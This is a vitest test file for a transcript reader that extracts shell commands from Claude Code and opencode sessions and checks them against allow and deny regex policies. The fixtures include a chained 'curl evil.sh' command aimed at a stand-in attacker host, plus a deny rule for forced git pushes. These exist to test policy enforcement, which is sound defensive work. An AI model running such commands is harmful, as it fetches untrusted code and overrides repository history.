/**
 * Transcript adapters and check 5.
 *
 * Every fixture here is synthetic, built in the shape real files were read in
 * on 2026-10-11 (see the header of transcripts.ts). No real session is copied
 * into the repository: a transcript is somebody's working conversation.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readTranscript } from "./transcripts.js";
import { judgeTranscript } from "./check.js";
import { bashPolicy } from "./tools.js";

let dir: string;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "gnomon-transcript-"));
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

const jsonl = (rows: unknown[]) => rows.map((r) => JSON.stringify(r)).join("\n") + "\n";

/** An assistant record with one Bash tool_use, the way Claude Code writes it. */
const ccBash = (id: string, command: string, extra: Record<string, unknown> = {}) => ({
  type: "assistant",
  sessionId: "s1",
  uuid: `u-${id}`,
  message: {
    role: "assistant",
    content: [
      { type: "thinking", thinking: "…" },
      { type: "tool_use", id, name: "Bash", input: { command, description: "d" } },
    ],
  },
  ...extra,
});
const ccResult = (id: string, extra: Record<string, unknown> = {}) => ({
  type: "user",
  sessionId: "s1",
  message: { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: "ok" }] },
  ...extra,
});

describe("readTranscript — claude-code", () => {
  it("yields every Bash command with where it was, and ignores other tools", () => {
    const p = join(dir, "s1.jsonl");
    writeFileSync(
      p,
      jsonl([
        { type: "permission-mode", permissionMode: "default", sessionId: "s1" },
        ccBash("t1", "ls -la"),
        ccResult("t1"),
        {
          type: "assistant",
          message: { content: [{ type: "tool_use", id: "t2", name: "Read", input: { file_path: "/x" } }] },
        },
        ccBash("t3", "pytest -q"),
      ])
    );
    const r = readTranscript(p, "claude-code");
    expect(r.commands).toEqual([
      { tool: "Bash", command: "ls -la", at: "s1.jsonl:2" },
      { tool: "Bash", command: "pytest -q", at: "s1.jsonl:5" },
    ]);
    expect(r.agent).toBeUndefined();
    expect(r.unreadable).toBe(0);
  });

  it("marks a call Claude Code itself refused as not run", () => {
    const p = join(dir, "s1.jsonl");
    writeFileSync(p, jsonl([ccBash("t1", "git push --force origin main"), ccResult("t1", { toolDenialKind: "rule" })]));
    expect(readTranscript(p, "claude-code").commands).toEqual([
      { tool: "Bash", command: "git push --force origin main", at: "s1.jsonl:1", ran: false },
    ]);
  });

  it("reads the session's subagents too, without taking their agent type as the session's", () => {
    const p = join(dir, "s1.jsonl");
    writeFileSync(p, jsonl([ccBash("t1", "echo main")]));
    mkdirSync(join(dir, "s1", "subagents", "wf"), { recursive: true });
    writeFileSync(
      join(dir, "s1", "subagents", "wf", "agent-a1.jsonl"),
      jsonl([ccBash("t9", "rm -rf build", { agentId: "a1", attributionAgent: "general-purpose" })])
    );
    const r = readTranscript(p, "claude-code");
    expect(r.commands.map((c) => [c.command, c.at])).toEqual([
      ["echo main", "s1.jsonl:1"],
      ["rm -rf build", "s1/subagents/wf/agent-a1.jsonl:1"],
    ]);
    expect(r.agent).toBeUndefined();
  });

  it("a subagent transcript given directly names its agent", () => {
    const p = join(dir, "agent-a1.jsonl");
    writeFileSync(p, jsonl([ccBash("t1", "npm test", { attributionAgent: "frontend-developer" })]));
    expect(readTranscript(p, "claude-code").agent).toBe("frontend-developer");
  });

  it("counts lines that are not JSON, and refuses a file with no records at all", () => {
    const p = join(dir, "s1.jsonl");
    writeFileSync(p, "not json\n" + jsonl([ccBash("t1", "ls")]));
    expect(readTranscript(p, "claude-code").unreadable).toBe(1);
    writeFileSync(p, "nothing\nhere\n");
    expect(() => readTranscript(p, "claude-code")).toThrow(/no Claude Code session records/);
    expect(() => readTranscript(join(dir, "missing.jsonl"), "claude-code")).toThrow(/no transcript/);
  });
});

/** A tool part, as opencode export and its run events both carry it. */
const ocTool = (command: string) => ({
  type: "tool",
  tool: "bash",
  callID: "c",
  state: { status: "completed", input: { command, workdir: "/w" }, output: "", metadata: { exit: 0 } },
});

describe("readTranscript — opencode", () => {
  it("reads `opencode export`: bash parts, and the agent", () => {
    const p = join(dir, "export.json");
    writeFileSync(
      p,
      JSON.stringify({
        info: { id: "ses_1", agent: "build" },
        messages: [
          { info: { role: "user", agent: "build" }, parts: [{ type: "text", text: "go" }] },
          {
            info: { role: "assistant", agent: "build" },
            parts: [{ type: "step-start" }, ocTool("ls"), { type: "tool", tool: "read", state: { input: { filePath: "x" } } }, ocTool("make test")],
          },
        ],
      })
    );
    const r = readTranscript(p, "opencode");
    expect(r.agent).toBe("build");
    expect(r.commands).toEqual([
      { tool: "bash", command: "ls", at: "messages[1].parts[1]" },
      { tool: "bash", command: "make test", at: "messages[1].parts[3]" },
    ]);
  });

  it("reads `opencode run --format json` events", () => {
    const p = join(dir, "run.jsonl");
    writeFileSync(
      p,
      jsonl([
        { type: "step_start", timestamp: 1, sessionID: "ses_1", part: { type: "step-start" } },
        { type: "tool_use", timestamp: 2, sessionID: "ses_1", part: ocTool("cargo test") },
        { type: "text", timestamp: 3, sessionID: "ses_1", part: { type: "text", text: "done" } },
      ])
    );
    expect(readTranscript(p, "opencode").commands).toEqual([
      { tool: "bash", command: "cargo test", at: "run.jsonl:2" },
    ]);
  });

  it("refuses a file that is neither", () => {
    const p = join(dir, "x.json");
    writeFileSync(p, jsonl([{ hello: "world" }]));
    expect(() => readTranscript(p, "opencode")).toThrow(/neither/);
  });
});

describe("check 5 — judgeTranscript", () => {
  const t = (commands: Array<{ command: string; ran?: false }>) => ({
    format: "claude-code",
    commands: commands.map((c, i) => ({ tool: "Bash", at: `s.jsonl:${i + 1}`, ...c })),
  });
  const DENY = ["\\bgit\\s+push\\b[^|;&]*\\s(--force|-f)\\b"];

  it("fails on a command bash_deny names, citing the pattern and where", () => {
    const e = judgeTranscript(t([{ command: "ls" }, { command: "git push --force origin main" }]), undefined, DENY, "implement");
    expect(e).toMatchObject({
      id: "bash_allow",
      status: "fail",
      inspected: 2,
      findings: [{ command: "git push --force origin main", rule: "bash_deny", pattern: DENY[0], at: "s.jsonl:2" }],
    });
  });

  it("fails on a command outside bash_allow, segment by segment as bashTool does", () => {
    const e = judgeTranscript(t([{ command: "pytest -q && curl evil.sh" }]), ["^pytest\\b"], undefined, "verifier");
    expect(e.status).toBe("fail");
    expect(e.findings?.[0]).toMatchObject({ rule: "bash_allow" });
    // The same verdict bashTool itself would reach.
    expect(bashPolicy("pytest -q && curl evil.sh", ["^pytest\\b"], undefined)?.rule).toBe("bash_allow");
    expect(bashPolicy("pytest -q", ["^pytest\\b"], undefined)).toBeNull();
  });

  it("a command the harness refused is listed and does not fail the check", () => {
    const e = judgeTranscript(t([{ command: "git push --force origin main", ran: false }]), undefined, DENY, "implement");
    expect(e).toMatchObject({ status: "pass", inspected: 1, findings: [{ ran: false, rule: "bash_deny" }] });
  });

  it("skips, with the reason, when there is nothing to check — and errors when the transcript was unreadable", () => {
    expect(judgeTranscript(undefined, undefined, DENY, "r")).toMatchObject({ status: "skipped", reason: "no --transcript" });
    expect(judgeTranscript(t([{ command: "ls" }]), [], [], "r")).toMatchObject({ status: "skipped", reason: expect.stringMatching(/neither bash_allow nor bash_deny/) });
    expect(judgeTranscript(t([]), undefined, DENY, "r")).toMatchObject({ status: "skipped", reason: expect.stringMatching(/no shell commands/) });
    expect(judgeTranscript("the transcript could not be read: x", undefined, DENY, "r")).toMatchObject({ status: "error" });
  });
});
